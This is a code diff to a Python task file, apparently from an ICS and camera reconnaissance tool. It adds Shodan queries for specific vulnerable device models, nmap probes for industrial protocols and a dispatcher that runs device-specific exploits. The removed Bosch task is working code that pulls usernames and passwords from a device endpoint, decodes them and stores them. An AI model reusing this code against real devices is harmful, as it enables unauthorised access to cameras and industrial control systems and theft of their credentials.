@@ -4,7 +4,7 @@ import math
 import maxminddb
 from libnmap.parser import NmapParser
 import os
-
+from time import sleep
 import flickrapi
 import requests
 from celery import shared_task, current_task
@@ -18,9 +18,15 @@ import pynmea2
 import base64
 import xmltodict
 
+from libnmap.process import NmapProcess
+from libnmap.parser import NmapParser
+import xmltodict
+
 import urllib.parse
 import urllib.request
 import xml.etree.ElementTree as et
+
+from app_kamerka import exploits
 
 from app_kamerka.models import Device, DeviceNearby, Search, TwitterNearby, FlickrNearby, ShodanScan, BinaryEdgeScore, \
     Whois, Bosch
@@ -208,7 +214,7 @@ ics_queries = {"niagara": "port:1911,4911 product:Niagara",
                "DLILPC": "DLILPC",
                "intelliSlot": "title:IntelliSlot",
                "temperature_monitor": "title:'Temperature Monitor' !title:avtech",
-               "CirCarLife": "CirCarLife",
+               "CirCarLife": "CirCarLife -ASUSTeK",
                "web_scada": "title:'web scada'",
                "kaco": "kaco",
                "indect_parkway": "title:indect",
@@ -229,15 +235,21 @@ ics_queries = {"niagara": "port:1911,4911 product:Niagara",
                "upshttpd": "Server: upshttpd",
                "poweragent": "PowerAgent",
                "CS121": "title:'CS121 SNMP/Web Adapter'",
-               }
+               "ab_ethernet":"cspv4",
+}
 
-coordinates_queries = {"webcam": "device:webcam",
+coordinates_queries = {"videoiq":'title:"VideoIQ Camera Login"',
+                        "webcam": "device:webcam",
                        "webcamxp": "webcamxp",
                        "vivotek": "vivotek",
+                       "netwave":'product:"Netwave IP camera http config"',
                        "techwin": "techwin",
+                       "lutron": 'html:<h1>LUTRON</h1>',
                        "mobotix": "mobotix",
                        "iqinvision": "iqinvision",
-                       "grandstream": "Grandstream",
+                       "grandstream": 'ssl:"Grandstream" "Set-Cookie: TRACKID"',
+                       "amcrest":'html:"@WebVersion@" html:amcrest',
+                       "contec":'"content/smarthome.php"',
                        'printer': "device:printer",
                        'mqtt': 'product:mqtt',
                        'rtsp': "port:'554'",
@@ -370,7 +382,7 @@ coordinates_queries = {"webcam": "device:webcam",
                        "upshttpd": "Server: upshttpd",
                        "poweragent": "PowerAgent",
                        "CS121": "title:'CS121 SNMP/Web Adapter'",
-
+                        "ab_ethernet":"cspv4"
                        }
 
 
@@ -571,7 +583,6 @@ def shodan_search_worker(fk, query, search_type, category, country=None, coordin
 
         pages = math.ceil(total / 100) + 1
         print(pages)
-
         for counter, result in enumerate(results['matches']):
             lat = str(result['location']['latitude'])
             lon = str(result['location']['longitude'])
@@ -1009,43 +1020,112 @@ def binary_edge_scan(id):
     device2 = BinaryEdgeScore(device=device1, grades=results['ip_score_detailed'], cve=cve, score=normalized_ip_score)
     device2.save()
 
+ics_scan = {"dnp3":"--script=nmap_scripts/dnp3-info.nse", "niagara":"--script=nmap_scripts/fox-info.nse",
+            "siemens":"--script=nmap_scripts/s7-info.nse" , "proconos":"--script=nmap_scripts/proconos-info.nse",
+            "pcworx":"--script=nmap_scripts/pcworx-info.nse", "omron":"--script=nmap_scripts/omron-info.nse",
+            "modbus":"--script=nmap_scripts/modbus-discover.nse", "ethernetip":"--script=nmap_scripts/enip-info.nse",
+            "codesys":"--script=nmap_scripts/codesys.nse", "ab_ethernet":"--script=nmap_scripts/cspv4-info.nse",
+            "tank":"--script=nmap_scripts/atg-info.nse", "modicon":"--script=nmap_scripts/modicon-info.nse"}
+
+
+
 @shared_task(bind=False)
-def bosch_usernames(id):
+def scan(id):
+    return_dict = {}
     device1 = Device.objects.get(id=id)
     ip = device1.ip
     port = device1.port
+    type = device1.type
 
-    try:
-        req = requests.get("http://"+ip +":"+port+"/User.cgi?cmd=get_user")
+    if type in ics_scan.keys():
+        nm = NmapProcess(ip, options="-p " + str(port) + " " + ics_scan[type])
+        nm.run_background()
 
-        xml = req.text
+        while nm.is_running():
+            print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nm.etc,
+                                                                  nm.progress))
+            sleep(2)
 
-        doc = xmltodict.parse(xml)
-        for user in doc['USER_SETTING']:
-            if user == 'result':
-                pass
-            else:
-                try:
-                    username = doc['USER_SETTING'][user]['USERNAME']
-                    pwd = doc['USER_SETTING'][user]['PWD']
+        u = xmltodict.parse(nm.stdout)
+        print(u['nmaprun'])
 
-                    if username:
-                        decoded_username = base64.b64decode(username)
-                        decoded_pwd = base64.b64decode(pwd)
-                        utf_username = decoded_username.decode("utf-8")
-                        utf_password = decoded_pwd.decode("utf-8")
-                        bosch_model = Bosch(device=device1, username=utf_username , password=utf_password )
-                        bosch_model.save()
-                        print(decoded_username)
-                except Exception as e:
-                    print(str(e))
-                    print(e)
-                    return True
+        try:
+            for i in u['nmaprun']['host']['ports']['port']['script']:
+                print(i)
 
-    except Exception as e:
-        print(str(e.args))
-        print(e)
-        return False
+                if i == "@output":
+                    return_dict["ID"] = u['nmaprun']['host']['ports']['port']['script']["@id"]
+                    return_dict["Output"] = u['nmaprun']['host']['ports']['port']['script']["@output"]
+
+            device1.scan = return_dict
+            device1.exploited_scanned = True
+            device1.save()
+            return return_dict
+
+
+        except Exception as e:
+            print(e)
+            return_dict["State"] = u['nmaprun']['host']['ports']['port']['state']["@state"]
+            return_dict["Reason"] = u['nmaprun']['host']['ports']['port']['state']["@reason"]
+            device1.scan = return_dict
+            device1.exploited_scanned = True
+
+            device1.save()
+            return return_dict
+
+
+    else:
+        nm = NmapProcess(ip, options="-p " + str(port))
+        nm.run_background()
+
+        while nm.is_running():
+            print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nm.etc,
+                                                                  nm.progress))
+            sleep(2)
+
+        u = xmltodict.parse(nm.stdout)
+
+        try:
+            return_dict["State"] = u['nmaprun']['host']['ports']['port']['state']['@state']
+            return_dict["Reason"] = u['nmaprun']['host']['ports']['port']['state']['@reason']
+            device1.scan = return_dict
+            device1.exploited_scanned = True
+            device1.save()
+            return return_dict
+        except:
+            pass
+
+@shared_task(bind=False)
+def exploit(id):
+    device1 = Device.objects.get(id=id)
+    print(device1.type)
+    if device1.type == "bosch_security":
+        usernames = exploits.bosch_usernames(device1)
+        return usernames
+    if device1.type == "videoiq":
+        users = exploits.videoiq(device1)
+        return users
+    if device1.type == "contec":
+        usernames = exploits.contec(device1)
+        return usernames
+    if device1.type == "grandstream":
+        check = exploits.grandstream(device1)
+        return check
+    if device1.type == "netwave":
+        status = exploits.netwave(device1)
+        return status
+    if device1.type == "CirCarLife":
+        plc_status = exploits.circarlife(device1)
+        return plc_status
+    if device1.type == "amcrest":
+        videotalk = exploits.amcrest(device1)
+        return videotalk
+    if device1.type == "lutron":
+        config = exploits.lutron(device1)
+        return config
+
+    else:
+        return {"Reason":"No exploit assigned"}
 
 
 @shared_task(bind=False)
